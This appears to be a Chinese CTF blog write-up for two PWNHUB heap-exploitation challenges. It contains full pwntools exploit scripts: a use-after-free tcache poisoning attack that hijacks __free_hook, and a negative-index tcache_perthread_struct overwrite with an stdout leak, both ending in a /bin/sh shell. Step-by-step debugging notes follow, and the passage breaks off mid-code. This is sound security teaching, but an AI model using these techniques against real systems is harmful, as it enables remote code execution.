@@ -1,0 +1,777 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="CTFer" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="CTFer" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="CTFer" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/2023/03/26/2023-3-PWHHUB/">
+
+
+
+  <title>
+2023_3_PWHHUB |
+Arashimuのblog = CTFer</title>
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">2023_3_PWHHUB
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2023-03-26 16:36:49">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-03-26T16:36:49+08:00">2023-03-26</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Arashimuのblog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewf5l51j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/26/2023-3-PWHHUB/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="岚沐">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="CTFer">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="sh_v11"><a class="markdownIt-Anchor" href="#sh_v11"></a> sh_v1.1</h2>
+<p>存在UAF漏洞，劫持<code>free_hook</code>即可<br />
+程序功能分析</p>
+<ul>
+<li>touch：创建一个chunk并写入一些东西</li>
+<li>rm：删除一个chunk，无UAF漏洞</li>
+<li>cat：打印一个chunk的内容</li>
+<li>ln chunk1 chunk2：将chunk2指向chunk1指向的地址(漏洞点，这里存在UAF)</li>
+</ul>
+<p>漏洞利用思路：先把tcache填满，然后free一个chunk到unsorted bin中，然后利用UAF泄露<code>main_arena+96</code>的地址，之后再次利用UAF改写tcache链将<code>free_hook</code>链入，然后申请出来，写入<code>system</code>的地址，最后将<code>/bin/sh</code>写入一个chunk中，然后释放这个chunk即可</p>
+<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span>  pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#from LibcSearcher import *</span>
+p=remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>,<span class="hljs-number">34883</span>)
+<span class="hljs-comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span>
+<span class="hljs-comment">#libc=ELF(&#x27;./libc-2.31.so&#x27;)</span>
+<span class="hljs-comment">#libc=ELF(&#x27;./libc-2.30.so&#x27;)</span>
+libc=ELF(<span class="hljs-string">&#x27;./libc-2.29.so&#x27;</span>)
+context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">filename,ctx</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;touch &#x27;</span>+filename
+	p.sendline(cmd)
+	p.sendline(ctx)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">filename</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;rm &#x27;</span>+filename
+	p.sendline(cmd)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>(<span class="hljs-params">filename</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;cat &#x27;</span>+filename
+	p.sendline(cmd)
+	<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">ln</span>(<span class="hljs-params">filename1,filename2</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;ln &#x27;</span>+filename1+<span class="hljs-string">&#x27; &#x27;</span>+filename2
+	p.sendline(cmd)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	p.sendline(<span class="hljs-string">&#x27;ls&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>(<span class="hljs-params">filename1,filename2</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;cp &#x27;</span>+filename1+<span class="hljs-string">&#x27; &#x27;</span>+filename2
+	p.sendline(cmd)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">filename,ctx</span>):
+	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)
+	cmd=<span class="hljs-string">&#x27;gedit &#x27;</span>+filename
+	p.sendline(cmd)
+	p.sendline(ctx)
+touch(<span class="hljs-string">&#x27;a1&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a2&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a3&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a4&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a5&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a6&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a7&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a8&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a9&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaa&#x27;</span>)
+
+ln(<span class="hljs-string">&#x27;a8&#x27;</span>,<span class="hljs-string">&#x27;a10&#x27;</span>)
+ln(<span class="hljs-string">&#x27;a7&#x27;</span>,<span class="hljs-string">&#x27;a11&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a1&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a2&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a3&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a4&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a5&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a6&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a7&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a8&#x27;</span>)
+
+unsorted_bin_arena=cat(<span class="hljs-string">&#x27;a10&#x27;</span>)
+<span class="hljs-comment">#libc_base=unsorted_bin_arena-96-0x3EBC40</span>
+<span class="hljs-comment">#libc_base=unsorted_bin_arena-96-0x1ECB80</span>
+<span class="hljs-comment">#libc_base=unsorted_bin_arena-96-0x1EAB80</span>
+libc_base=unsorted_bin_arena-<span class="hljs-number">96</span>-<span class="hljs-number">0x1E4C40</span>
+<span class="hljs-comment"># main_arena=unsorted_bin_arena-96</span>
+<span class="hljs-comment"># libc=LibcSearcher(&#x27;main_arena&#x27;, main_arena)</span>
+<span class="hljs-comment"># libc_base=main_arena-libc.dump(&#x27;main_arena&#x27;)</span>
+
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base+libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc base: &#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))
+<span class="hljs-comment"># libc=LibcSearcher(&quot;./sh_v1.1&quot;,int(heapaddr))</span>
+<span class="hljs-comment"># print(hex(libc.dump(&#x27;system&#x27;)))</span>
+
+free_hook_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
+system_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
+<span class="hljs-comment"># free_hook_addr=libc_base+libc.dump(&#x27;__free_hook&#x27;)</span>
+<span class="hljs-comment"># system_addr=libc_base+libc.dump(&#x27;system&#x27;)</span>
+edit(<span class="hljs-string">&#x27;a11&#x27;</span>,p64(free_hook_addr))
+touch(<span class="hljs-string">&#x27;a12&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)
+touch(<span class="hljs-string">&#x27;a13&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#free_hook_addr</span>
+edit(<span class="hljs-string">&#x27;a13&#x27;</span>,p64(system_addr))
+edit(<span class="hljs-string">&#x27;a12&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
+rm(<span class="hljs-string">&#x27;a12&#x27;</span>)
+
+p.interactive()
+</code></pre>
+<h2 id="three_edit"><a class="markdownIt-Anchor" href="#three_edit"></a> three_edit</h2>
+<p>没有常见的漏洞，但存在一个可以写负数的漏洞，使得我们可以改写<code>tcache_struct</code></p>
+<p>先上exp</p>
+<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
+
+file_name = <span class="hljs-string">&#x27;./pwn4&#x27;</span>
+li = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)
+ll = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)
+elf = ELF(file_name)
+menu = <span class="hljs-string">&#x27;is:&#x27;</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):
+    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)
+    r.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))
+    r.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))
+    r.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
+    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)
+    r.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):
+    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)
+    r.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))
+    r.sendlineafter(<span class="hljs-string">&#x27;new content:&#x27;</span>, content)
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-keyword">try</span>:
+        r = process(file_name)
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):
+            add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x8</span>)
+
+        delete(<span class="hljs-number">0</span>)
+        delete(<span class="hljs-number">3</span>)    <span class="hljs-comment">#tcache 先进后出 chunk3=&gt;chunk0</span>
+
+        edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0xe0</span>)) <span class="hljs-comment">#  chunk3=&gt;chunk_</span>
+        <span class="hljs-string">&#x27;&#x27;&#x27;
+        chunk0
+        chunk_
+        chunk1
+        &#x27;&#x27;&#x27;</span>
+        add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk0=chunk3</span>
+        add(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk3=chunk_</span>
+
+        edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x481</span>)) <span class="hljs-comment"># 修改chunk1的size</span>
+ 
+        delete(<span class="hljs-number">1</span>)   <span class="hljs-comment"># chunk1=&gt;unsorted bin</span>
+        delete(<span class="hljs-number">5</span>)
+        delete(<span class="hljs-number">2</span>)
+        delete(<span class="hljs-number">4</span>)   <span class="hljs-comment"># tcache: chunk4=&gt;chunk2=&gt;chunk5</span>
+
+        edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0x20</span>)) <span class="hljs-comment"># chunk4=&gt;chunk1</span>
+
+        edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x81</span>) + p16(<span class="hljs-number">0x56a0</span>)) <span class="hljs-comment">#修改chunk1大小还有修改unsortedbin后2个字节爆破stdout</span>
+
+
+        add(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk1=chunk4   </span>
+        add(<span class="hljs-number">5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk5=chunk1</span>
+        add(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)) <span class="hljs-comment"># chunk2=stdout</span>
+        <span class="hljs-comment"># chunk2=context时会触发</span>
+        leak_addr = u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+        li(<span class="hljs-string">&#x27;leak_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(leak_addr))
+
+        <span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span>
+        libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)
+        libc_base = leak_addr - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]
+        li(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))
+        free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base
+        li(<span class="hljs-string">&#x27;free_hook = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))
+        one = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]
+        one_gadget = one[<span class="hljs-number">1</span>] + libc_base
+        system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
+
+        delete(<span class="hljs-number">0</span>)
+        delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># chunk1(chunk4)=&gt;chunk0(chunk3)</span>
+
+        edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0x60</span>)) <span class="hljs-comment"># chunk1=&gt;chunk__</span>
+        add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;d&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk0=chunk1(chunk4)</span>
+        <span class="hljs-string">&#x27;&#x27;&#x27;
+        chunk3
+        chunk__
+        chunk4
+        &#x27;&#x27;&#x27;</span>
+        add(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;e&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk1=chunk__</span>
+
+        delete(<span class="hljs-number">10</span>)          
+        delete(<span class="hljs-number">0</span>)       <span class="hljs-comment"># chunk0=&gt;chunk10</span>
+
+        edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x81</span>) + p64(free_hook)) <span class="hljs-comment"># chunk0(chunk4)=&gt;free_hook</span>
+        add(<span class="hljs-number">10</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)    <span class="hljs-comment"># chunk10=chunk0</span>
+        add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, p64(system_addr))  <span class="hljs-comment"># free_hook=system_addr</span>
+
+        delete(<span class="hljs-number">10</span>)    <span class="hljs-comment"># free(chunk10_)=system(&#x27;/bin/sh&#x27;)</span>
+
+        r.interactive()
+    <span class="hljs-keyword">except</span>:
+        r.close()
+</code></pre>
+<h3 id="调试分析"><a class="markdownIt-Anchor" href="#调试分析"></a> 调试分析</h3>
+<p>原理：第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code></p>
+<pre class="highlight"><code class="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span>
+&#123;</span>
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>
+&#125; tcache_entry;
+
+<span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS                64</span>
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span>
+&#123;</span>
+  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+&#125; tcache_perthread_struct;
+
+</code></pre>
+<p>而这个一开始分配的chunk的大小就是平时我们看到的最上面的大小为<code>0x291</code>的chunk</p>
+<h4 id="漏洞点分析"><a class="markdownIt-Anchor" href="#漏洞点分析"></a> 漏洞点分析</h4>
+<p><img data-src="/images/202303pwnhub/te12.png" alt="" /><br />
+<img data-src="/images/202303pwnhub/te13.png" alt="" /></p>
+<h4 id="part1"><a class="markdownIt-Anchor" href="#part1"></a> part1</h4>
+<pre class="highlight"><code class="python">delete(<span class="hljs-number">0</span>)
+delete(<span class="hljs-number">3</span>)    <span class="hljs-comment">#tcache 先进后出 chunk3=&gt;chunk0</span>
+
+edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0xe0</span>)) <span class="hljs-comment">#  chunk3=&gt;chunk_</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+chunk0
+chunk_
+chunk1
+&#x27;&#x27;&#x27;</span>
+</code></pre>
+<p><img data-src="/images/202303pwnhub/te1.png" alt="" /><br />
+<img data-src="/images/202303pwnhub/te2.png" alt="" /><br />
+查看最顶上的chunk的内容<br />
+<img data-src="/images/202303pwnhub/te3.png" alt="" /><br />
+可以发现我们释放的chunk3存在于<code>0x291</code>大小的chunk中，而我们edit的时候可以写入负数大小的index，并且heapaddr数组也是通过malloc申请的，而题目中具体的写入位置是<code>heapaddr+index*8LL</code>，计算偏移<br />
+<code>0x5633560e70c0=480-0x5633560e72a0=-480</code>，那么<code>index=-480/8=-60</code>。此时我们就可以控制chunk3的<code>fd</code>了<br />
+<img data-src="/images/202303pwnhub/te4.png" alt="" /><br />
+<img data-src="/images/202303pwnhub/te5.png" alt="" /></p>
+<h4 id="part2"><a class="markdownIt-Anchor" href="#part2"></a> part2</h4>
+<pre class="highlight"><code class="python">add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk0=chunk3</span>
+add(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk3=chunk_</span>
+edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x481</span>)) <span class="hljs-comment"># 修改chunk1的size</span>
+</code></pre>
+<p>然后我们申请chunk_，通过chunk_来修改chunk1的大小<br />
+这里是所以要构造一个中间chunk_，是因为我们没有UAF可以利用<br />
+<img data-src="/images/202303pwnhub/te6.png" alt="" /><br />
+此时chunk1-chunk9进行了overlap</p>
+<h4 id="part3"><a class="markdownIt-Anchor" href="#part3"></a> part3</h4>
+<pre class="highlight"><code class="python">delete(<span class="hljs-number">1</span>)   <span class="hljs-comment"># chunk1=&gt;unsorted bin</span>
+delete(<span class="hljs-number">5</span>)
+delete(<span class="hljs-number">2</span>)
+delete(<span class="hljs-number">4</span>)   <span class="hljs-comment"># tcache: chunk4=&gt;chunk2=&gt;chunk5</span>
+</code></pre>
+<p>由于修改了chunk1的大小超出了tcache的范围，所以此时释放chunk1会进入unsorted bin<br />
+<img data-src="/images/202303pwnhub/te8.png" alt="" /><br />
+<img data-src="/images/202303pwnhub/te7.png" alt="" /></p>
+<h4 id="part4"><a class="markdownIt-Anchor" href="#part4"></a> part4</h4>
+<pre class="highlight"><code class="python">edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0x20</span>)) <span class="hljs-comment"># chunk4=&gt;chunk1</span>
+edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x81</span>) + p16(<span class="hljs-number">0x56a0</span>)) <span class="hljs-comment">#修改chunk1大小还有修改unsortedbin后2个字节爆破stdout</span>
+</code></pre>
+<p>利用part1同样的手法，通过修改chunk4的fd的后两个字节来把chunk1链入tcache中，此时chunk1即在tcache中也再unsorted中<br />
+<img data-src="/images/202303pwnhub/te9.png" alt="" /><br />
+而在part1中我们保留了可以修改chunk1的方法，那么此时就可以修改chunk1的fd为<code>stdout</code>，但由于<code>stdout</code>不知道，所以我们需要爆破后两个字节<br />
+<img data-src="/images/202303pwnhub/te10.png" alt="" /></p>
+<h4 id="part5"><a class="markdownIt-Anchor" href="#part5"></a> part5</h4>
+<pre class="highlight"><code class="python">add(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk1=chunk4   </span>
+add(<span class="hljs-number">5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk5=chunk1</span>
+add(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)) <span class="hljs-comment"># chunk2=stdout</span>
+<span class="hljs-comment"># chunk2=context时会触发</span>
+leak_addr = u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+</code></pre>
+<p>申请到<code>stdout</code>，然后修改<code>stdout</code>的结构体的<code>flag</code>、<code>write_base</code>，使得可以读出libc上的地址<code>_IO_2_1_stdin_</code><br />
+<img data-src="/images/202303pwnhub/te11.png" alt="" /></p>
+<h4 id="part6"><a class="markdownIt-Anchor" href="#part6"></a> part6</h4>
+<pre class="highlight"><code class="python">libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)
+libc_base = leak_addr - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]
+li(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))
+free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base
+li(<span class="hljs-string">&#x27;free_hook = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))
+one = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]
+one_gadget = one[<span class="hljs-number">1</span>] + libc_base
+system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
+</code></pre>
+<p>这部分就计算各个函数的真实地址了</p>
+<h4 id="part6-2"><a class="markdownIt-Anchor" href="#part6-2"></a> part6</h4>
+<pre class="highlight"><code class="python">delete(<span class="hljs-number">0</span>)
+delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># chunk1(chunk4)=&gt;chunk0(chunk3)</span>
+edit(-<span class="hljs-number">60</span>, p8(<span class="hljs-number">0x60</span>)) <span class="hljs-comment"># chunk1=&gt;chunk__</span>
+add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;d&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk0=chunk1(chunk4)</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
